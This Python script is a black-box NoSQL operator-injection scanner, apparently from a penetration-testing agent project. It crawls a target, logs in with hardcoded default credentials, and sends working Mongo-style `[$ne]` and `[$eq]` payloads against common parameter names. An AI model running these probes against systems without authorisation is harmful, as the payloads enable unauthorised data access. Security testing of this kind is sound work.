#!/usr/bin/env python3
r"""nosqli_harness.py - NoSQL operator-injection detector (black-box, anonymous).

Confirm oracle (CONSERVATIVE triple-differential, built for zero-FP): for a candidate (endpoint,
param) we send three shaped requests with a RANDOM value Z that should match no record:

  1. literal   p=Z            -> expect "empty"  (no record equals a random value)
  2. operator  p[$ne]=Z       -> if the backend interprets the operator, this matches EVERYTHING
                                  except Z  -> "data"
  3. operator  p[$eq]=Z       -> if interpreted as an operator, equals the literal -> "empty"

A finding is CONFIRMED only when the triple is exactly (literal=empty, $ne=data, $eq=empty). That
pattern cannot arise from ordinary array-param handling or coincidence: it requires the server to be
evaluating our injected Mongo-style operators against the query. A single differential, a param that
is simply array-tolerant, or an error is NOT confirmed. Each response is bucketed into
{data, empty, error} from status + body signature only - no payload reflection is trusted.

Self-contained: NABLUS_TARGET / NABLUS_SEEDS, writes nosqli_findings.json. `--selftest` = offline.
"""
from __future__ import annotations  # noqa
import os, re, sys, json, time, random, hashlib, http.cookiejar
import urllib.request, urllib.parse, urllib.error, pathlib
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from html.parser import HTMLParser

BASE = os.environ.get("NABLUS_TARGET", "http://127.0.0.1:8099").rstrip("/")
OUT = r"C:\Users\Laith\nabulus-agent\nosqli_findings.json"
SEEDS = [s.strip() for s in os.environ.get("NABLUS_SEEDS", "").split(",") if s.strip()]
PACE = 0.02

NOSQL_PARAMS = ["id", "uid", "user", "user_id", "username", "name", "q", "search", "query", "email",
                "token", "key", "slug", "ref", "status", "role", "type", "category", "tag", "item",
                "product", "order", "account", "page", "filter", "sort"]


def bucket(status, body):
    """Map a response to one of {data, empty, error} by status + content signature only."""
    if status == 0 or status >= 500:
        return "error"
    if status in (400, 401, 403):
        return "error"
    if status == 404:
        return "empty"
    low = body.lower()
    # explicit "nothing" signals
    if any(s in low for s in ("not found", "no results", "no record", "does not exist", "null")) and len(body) < 400:
        return "empty"
    # structural emptiness
    stripped = body.strip()
    if stripped in ("", "[]", "{}", '{"data":[]}', '{"results":[]}', "null"):
        return "empty"
    if re.search(r'"(?:data|results|items|rows|users|records)"\s*:\s*\[\s*\]', body):
        return "empty"
    # a 200 with real content = data
    if status == 200 and len(stripped) > 2:
        return "data"
    return "empty"


def judge(lit, ne, eq):
    """Pure oracle. Confirm iff the triple is exactly (literal empty, $ne data, $eq empty)."""
    return lit == "empty" and ne == "data" and eq == "empty"


class _Links(HTMLParser):
    def __init__(self):
        super().__init__(); self.hrefs = []
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if a.get("href"):
            self.hrefs.append(a["href"])


def login_cookie():
    cj = http.cookiejar.CookieJar()
    try:
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        op.open(BASE + "/login", data=urlencode(
            {"username": os.environ.get("NABLUS_USER", "alice"),
             "password": os.environ.get("NABLUS_PASS", "Sunflower#A1pha")}).encode(), timeout=8)
    except Exception:
        pass
    return "; ".join(f"{c.name}={c.value}" for c in cj)


def fetch(url, cookie):
    if PACE:
        time.sleep(PACE)
    try:
        req = urllib.request.Request(url, headers={"Cookie": cookie} if cookie else {})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read(120000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read(120000).decode("utf-8", "replace") if e.fp else "")
    except Exception:
        return 0, ""


def candidates(cookie):
    seen, frontier, cands, stems = set(), [BASE + "/"], set(), set()
    for _ in range(2):
        nxt = []
        for u in frontier:
            if u in seen or len(seen) >= 15:
                continue
            seen.add(u)
            st, body = fetch(u, cookie)
            if st not in (200, 301, 302, 303, 307, 308):
                continue
            pr = urlparse(u)
            stems.add(f"{pr.scheme}://{pr.netloc}{pr.path}")
            for k, _v in parse_qsl(pr.query):
                cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
            p = _Links()
            try:
                p.feed(body)
            except Exception:
                pass
            for h in p.hrefs:
                link = urljoin(u, h).split("#")[0]
                if link.startswith(BASE) and link not in seen and "logout" not in link.lower():
                    nxt.append(link)
        frontier = nxt
    for s in SEEDS:
        pr = urlparse(s if "://" in s else BASE + ("" if s.startswith("/") else "/") + s)
        stems.add(f"{pr.scheme}://{pr.netloc}{pr.path}")
        for k, _v in parse_qsl(pr.query):
            cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
    for stem in stems | {BASE + "/"}:
        for pn in NOSQL_PARAMS:
            cands.add((stem, pn))
    return sorted(cands)


def confirm(base, param, cookie):
    z = f"zz{random.randint(10**6, 10**7)}zz"               # value that should match nothing
    lit = bucket(*fetch(f"{base}?{urlencode({param: z})}", cookie))
    if lit != "empty":
        return None                                         # need a clean 'no match' baseline first
    ne = bucket(*fetch(f"{base}?{urlencode({f'{param}[$ne]': z})}", cookie))
    eq = bucket(*fetch(f"{base}?{urlencode({f'{param}[$eq]': z})}", cookie))
    if judge(lit, ne, eq):
        return {"probe_value": z, "buckets": {"literal": lit, "$ne": ne, "$eq": eq}}
    return None


def main():
    cookie = login_cookie()
    cands = candidates(cookie)
    findings, tested = [], set()
    print(f"target: {BASE} | candidates: {len(cands)}")
    for base, param in cands:
        key = base + "|" + param
        if key in tested:
            continue
        tested.add(key)
        proof = confirm(base, param, cookie)
        if proof:
            findings.append({"class": "nosqli", "severity": "high", "endpoint": base, "param": param,
                             "proof": proof,
                             "proof_request": f"GET {base}?{param}[$ne]={proof['probe_value']}",
                             "validated_by": "Mongo-style operator injection changed query semantics "
                                             "(literal=empty, $ne=data, $eq=empty) - NoSQL injection",
                             "confirmed": True})
            print(f"[nosqli] CONFIRMED: {urlparse(base).path}?{param}  {proof['buckets']}")
    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2), encoding="utf-8")
    print(f"[nosqli] confirmed NoSQLi findings: {len(findings)} -> {OUT}")
    return 0


def selftest():
    ok = True
    # bucket() checks
    btests = [
        (200, '[{"id":1,"name":"a"}]', "data"),
        (200, '{"data":[]}', "empty"),
        (200, '[]', "empty"),
        (404, "Not Found", "empty"),
        (500, "stack trace", "error"),
        (403, "forbidden", "error"),
        (200, '{"results":[  ]}', "empty"),
        (200, "null", "empty"),
    ]
    for st, body, want in btests:
        got = bucket(st, body)
        flag = "OK" if got == want else "FAIL"
        if got != want:
            ok = False
        print(f"  [{flag}] bucket({st}): {got} want={want}")
    # judge() checks - only the exact injection triple confirms
    jtests = [
        (("empty", "data", "empty"), True),     # the injection signature
        (("empty", "data", "data"),  False),    # $eq also data -> array-tolerant, not operator eval
        (("data",  "data", "empty"), False),    # literal already returned data -> bad baseline
        (("empty", "empty", "empty"), False),   # operators ignored
        (("empty", "error", "empty"), False),   # $ne errored
    ]
    for triple, want in jtests:
        got = judge(*triple)
        flag = "OK" if got == want else "FAIL"
        if got != want:
            ok = False
        print(f"  [{flag}] judge{triple}: {got} want={want}")
    print("SELFTEST", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        raise SystemExit(selftest())
    raise SystemExit(main())
